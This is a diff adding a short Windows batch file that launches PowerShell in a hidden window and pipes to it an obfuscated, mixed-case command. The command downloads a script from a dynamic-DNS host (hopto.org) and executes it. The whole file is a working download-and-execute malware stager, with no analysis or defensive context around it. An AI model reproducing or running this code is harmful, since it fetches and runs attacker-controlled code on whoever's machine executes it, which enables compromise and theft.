@@ -1,0 +1,5 @@
+@echo off
+cd %SystemRoot%\System32
+set a=WindowsPowerShell\v1.0\powershell.exe -n op -win 1 -
+
+echo ieX("IeX(New-oBJeCt Net.WebClIeNt).DownloadString('http://a9b1-c34fd1.hopto.org/L2607/kk/1445785485')"); | %a
